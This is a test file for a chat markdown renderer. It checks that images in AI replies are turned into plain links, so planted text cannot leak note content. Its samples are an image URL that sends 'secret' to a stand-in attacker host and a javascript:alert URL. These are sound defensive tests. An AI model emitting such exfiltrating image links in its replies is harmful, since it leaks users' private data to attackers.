import { describe, expect, it } from "vitest";
import { render } from "@testing-library/react";
import ReactMarkdown from "react-markdown";
import { chatMarkdownComponents, chatMarkdownPlugins } from "../chat-markdown";

function renderReply(md: string) {
  return render(
    <ReactMarkdown remarkPlugins={chatMarkdownPlugins} components={chatMarkdownComponents}>
      {md}
    </ReactMarkdown>,
  );
}

describe("chat markdown", () => {
  it("never loads an image from a reply, so planted text cannot send note content out", () => {
    const { container, getByRole } = renderReply("Done ![logo](https://attacker.example/x.png?d=secret)");
    expect(container.querySelector("img")).toBeNull();
    const link = getByRole("link", { name: "Image: logo" });
    expect(link.getAttribute("href")).toBe("https://attacker.example/x.png?d=secret");
  });

  it("drops an image with an unsafe address to plain text", () => {
    const { container, getByText } = renderReply("![x](javascript:alert(1))");
    expect(container.querySelector("img, a")).toBeNull();
    expect(getByText("Image: x")).toBeInTheDocument();
  });
});
